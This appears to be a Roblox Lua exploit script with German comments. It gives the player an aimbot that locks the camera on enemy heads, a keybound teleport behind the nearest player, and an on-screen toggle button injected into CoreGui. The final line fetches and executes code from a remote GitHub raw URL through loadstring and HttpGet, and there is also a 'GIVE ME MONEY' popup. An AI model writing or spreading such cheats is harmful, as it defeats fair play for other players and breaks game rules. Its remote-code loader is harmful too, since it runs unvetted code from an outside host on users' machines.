--===[ Konsole Info ]===--
print("Close Script = F8")
print("Switch Mode (Team/Solo) = F1")
print("Teleport = F")
print("Toggle Aimbot = T")

--===[ Services ]===--
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

--===[ Variablen ]===--
local player = Players.LocalPlayer
local running = true
local currentMode = "solo"
local inputConnection = nil
local aimbotActive = false
local targetPlayer = nil

--===[ Funktionen ]===--

-- Aimbot Toggle Logik
local function toggleAimbot()
    aimbotActive = not aimbotActive
    if aimbotActive then
        local head = getClosestEnemyToScreenCenter(500)
        if head then
            targetPlayer = Players:GetPlayerFromCharacter(head.Parent)
        end
        print("Aimbot: ON")
        StarterGui:SetCore("SendNotification", {
            Title = "Aimbot",
            Text = "Aimbot aktiviert (T/Button)",
            Duration = 3
        })
    else
        targetPlayer = nil
        print("Aimbot: OFF")
        StarterGui:SetCore("SendNotification", {
            Title = "Aimbot",
            Text = "Aimbot deaktiviert",
            Duration = 3
        })
    end
end

-- Spieler finden
local function getClosestPlayer(ignoreTeam, minDistance)
    local myChar = player.Character
    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end
    local myPos = myChar.HumanoidRootPart.Position
    local closestPlayer = nil
    local minDist = math.huge

    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local humanoid = otherPlayer.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local isEnemy = not (player.Team and otherPlayer.Team and player.Team == otherPlayer.Team)
                if ignoreTeam or isEnemy then
                    local dist = (myPos - otherPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if dist >= minDistance and dist < minDist then
                        minDist = dist
                        closestPlayer = otherPlayer
                    end
                end
            end
        end
    end
    return closestPlayer
end

-- Aimbot Ziel finden
function getClosestEnemyToScreenCenter(maxDistance)
    local closestHead = nil
    local smallestDistance = math.huge
    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("Head") then
            local humanoid = otherPlayer.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local isEnemy = not (player.Team and otherPlayer.Team and player.Team == otherPlayer.Team)
                local head = otherPlayer.Character.Head
                local distanceToPlayer = (player.Character.HumanoidRootPart.Position - head.Position).Magnitude
                if isEnemy and distanceToPlayer <= maxDistance then
                    local screenPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    if onScreen then
                        local distFromCenter = (Vector2.new(screenPos.X, screenPos.Y) - screenCenter).Magnitude
                        if distFromCenter < smallestDistance then
                            smallestDistance = distFromCenter
                            closestHead = head
                        end
                    end
                end
            end
        end
    end
    return closestHead
end

--===[ Aimbot Render Step ]===--
RunService.RenderStepped:Connect(function()
    if running and aimbotActive and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
        local head = targetPlayer.Character.Head
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, head.Position)
    end
end)

--===[ Tasteneingaben ]===--
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.T then
        toggleAimbot()
    elseif input.KeyCode == Enum.KeyCode.F1 then
        currentMode = (currentMode == "solo") and "team" or "solo"
        activateMode(currentMode)
    end
end)

--===[ Moduswechsel & Teleport ]===--
local function enableAimbotForOneSecond()
    aimbotActive = true
    task.delay(1, function() aimbotActive = false end)
end

function activateMode(mode)
    deactivateCurrentMode()
    inputConnection = UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.F then
            local target = (mode == "team") and getClosestPlayer(false, 30) or getClosestPlayer(true, 0)
            if not target then return end
            local myChar, targetHRP = player.Character, target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if targetHRP and myHRP then
                myHRP.CFrame = CFrame.new(targetHRP.Position - targetHRP.CFrame.LookVector, targetHRP.Position)
                print("Teleported to:", target.Name)
                enableAimbotForOneSecond()
            end
        elseif input.KeyCode == Enum.KeyCode.F3 then
            running = false
            print("Stopped (F3).")
        elseif input.KeyCode == Enum.KeyCode.F8 then
            running = false
            deactivateCurrentMode()
            print("Script closed (F8).")
            StarterGui:SetCore("SendNotification", {
                Title = "Script Closed",
                Text = "Script closed",
                Duration = 5
            })
        end
    end)
    print("Mode activated:", mode)
    StarterGui:SetCore("SendNotification", {
        Title = "Mode switched",
        Text = "Mode: " .. (mode == "team" and "Team mode" or "Solo mode"),
        Duration = 5
    })
end

function deactivateCurrentMode()
    if inputConnection then
        inputConnection:Disconnect()
        inputConnection = nil
    end
end

--===[ GUI Aimbot Button ]===--
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScriptHubUI"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true

local ToggleButtonFrame = Instance.new("Frame")
ToggleButtonFrame.Name = "ToggleButtonFrame"
ToggleButtonFrame.Parent = ScreenGui
ToggleButtonFrame.BackgroundTransparency = 1
ToggleButtonFrame.Position = UDim2.new(0.5, -37, 0.5, -37)
ToggleButtonFrame.Size = UDim2.new(0, 75, 0, 75)

local ToggleButton = Instance.new("TextButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = ToggleButtonFrame
ToggleButton.BackgroundTransparency = 1
ToggleButton.Size = UDim2.new(1, 0, 1, 0)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "Click for Aim-Bot"
ToggleButton.TextColor3 = Color3.new(1, 1, 1)
ToggleButton.TextWrapped = true
ToggleButton.TextScaled = true

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(1, 0)
UICorner.Parent = ToggleButton

-- Dragging Button (Mobile & PC support)
local dragging = false
local dragStart
local startPos

local function updateDrag(input)
    if dragging then
        local delta = input.Position - dragStart
        ToggleButtonFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end

ToggleButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = ToggleButtonFrame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateDrag(input)
    end
end)

ToggleButton.MouseButton1Click:Connect(function()
	toggleAimbot()
end)

--===[ Start ]===--
activateMode(currentMode)

StarterGui:SetCore("SendNotification", {
    Title = "Kiddo",
    Text = "GIVE ME MONEY\n\nHello, " .. player.DisplayName,
    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=180&h=180",
    Duration = 10
})

-- Optional: Load externes Script
loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
